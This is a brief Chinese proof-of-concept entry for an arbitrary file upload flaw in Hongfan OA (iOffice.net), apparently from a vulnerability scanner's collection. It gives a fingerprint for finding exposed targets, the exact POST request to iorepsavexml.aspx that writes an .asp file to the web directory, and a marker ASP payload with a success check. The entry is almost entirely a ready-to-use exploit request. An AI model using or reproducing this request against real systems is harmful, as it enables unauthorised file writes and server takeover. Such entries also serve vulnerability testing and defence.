# 红帆OAiorepsavexml.aspx任意文件上传漏洞

红帆OAiorepsavexml.aspx ｜ 文件上传 ｜ —
- **指纹**：`title="iOffice.net"`
- **请求**：`POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=dudesuite.asp&filepath=/upfiles/rep/pic/ HTTP/1.1`

**Payload**
```
<% Response.Write("dudesuite") %>
```
- **响应特征**：200